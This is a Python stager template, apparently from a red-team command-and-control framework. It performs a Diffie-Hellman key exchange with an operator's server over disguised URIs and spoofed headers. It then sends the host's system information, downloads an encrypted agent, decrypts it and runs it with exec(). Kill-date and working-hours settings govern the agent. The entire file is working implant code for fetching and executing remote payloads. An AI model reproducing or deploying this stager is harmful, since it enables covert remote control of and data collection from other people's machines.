#!/usr/bin/env python3

"""
This file is a Jinja2 template.
    Variables:
        working_hours
        kill_date
        staging_key
        profile
"""

import random
import string
import urllib.request

{% include 'common/aes.py' %}
{% include 'common/chacha.py' %}
{% include 'common/diffiehellman.py' %}
{% include 'common/get_sysinfo.py' %}
{% include 'common/mtls.py' %}

REPLACE_COMMS


class Stage:
    def __init__(self):
        self.staging_key = b'{{ staging_key }}'
        self.profile = '{{ profile }}'
        self.server = '{{ host }}'
        self.kill_date = '{{ kill_date }}'
        self.working_hours = '{{ working_hours }}'
        self.agent_private_cert_key = {{ agent_private_cert_key }}
        self.agent_public_cert_key = {{ agent_public_cert_key }}
        self.server_public_cert_key = {{ server_public_cert_key }}

        if self.server.startswith("https"):
            hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None

        self.session_id = b'00000000'
        self.key = None
        self.headers = self.initialize_headers(self.profile)
        self.packet_handler = ExtendedPacketHandler(None, staging_key=self.staging_key, session_id=self.session_id, headers=self.headers, server=self.server, taskURIs=self.taskURIs)

    def initialize_headers(self, profile):
        parts = profile.split('|')
        self.taskURIs = parts[0].split(',')
        userAgent = parts[1]
        headersRaw = parts[2:]
        headers = {'User-Agent': userAgent}
        for headerRaw in headersRaw:
            try:
                headerKey, headerValue = headerRaw.split(":")
                headers[headerKey] = headerValue
            except Exception:
                pass
        return headers

    def execute(self):
        client_pub = DiffieHellman()
        agent_cert = signature_unsafe(b"SIGNATURE", self.agent_private_cert_key, self.agent_public_cert_key)
        public_key = client_pub.publicKey

        nbytes = (public_key.bit_length() + 7) // 8
        pub_bytes = public_key.to_bytes(nbytes, 'big')
        message = pub_bytes+agent_cert
        hmac_data = aes_encrypt_then_hmac(self.staging_key, message)

        # Build and Send Routing Packet
        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=2, enc_data=hmac_data)
        post_uri = self.server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
        response = self.packet_handler.post_message(post_uri, routing_packet)

        # Decrypt Server Response
        packet = self.packet_handler.parse_routing_packet(self.staging_key, response)
        self.session_id = list(packet.keys())[0]
        self.packet_handler.session_id = self.session_id
        encdata = packet[self.session_id][3]

        data = aes_decrypt_and_verify(self.staging_key, encdata)
        data = data.encode('latin-1')
        nonce = data[:16]
        server_pub = int.from_bytes(data[16:784], byteorder='big', signed=False)
        server_cert = data[784:848]

        if not checkvalid(server_cert, b"SIGNATURE", self.server_public_cert_key):
            print("Server certificate not valid")
            return

        # Generate Shared Secret
        client_pub.genKey(server_pub)
        self.key = client_pub.key
        self.packet_handler.key = self.key

        # Send System Info
        post_uri = self.server + "{{ stage_2 | default('/index.php', true) | ensureleadingslash}}"
        hmac_data = aes_encrypt_then_hmac(self.key, get_sysinfo(nonce=str(int(nonce) + 1)).encode('UTF-8'))
        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=3, enc_data=hmac_data)
        response = self.packet_handler.post_message(post_uri, routing_packet)

        # Decrypt and Execute Agent
        packet = self.packet_handler.parse_routing_packet(self.staging_key, response)
        agent_code = aes_decrypt_and_verify(self.key, packet[self.session_id][3])
        exec(agent_code, globals())
        agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server, session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
        self.packet_handler.agent = agent
        agent.run()

# Initialize and Execute Agent
stage = Stage()
stage.execute()
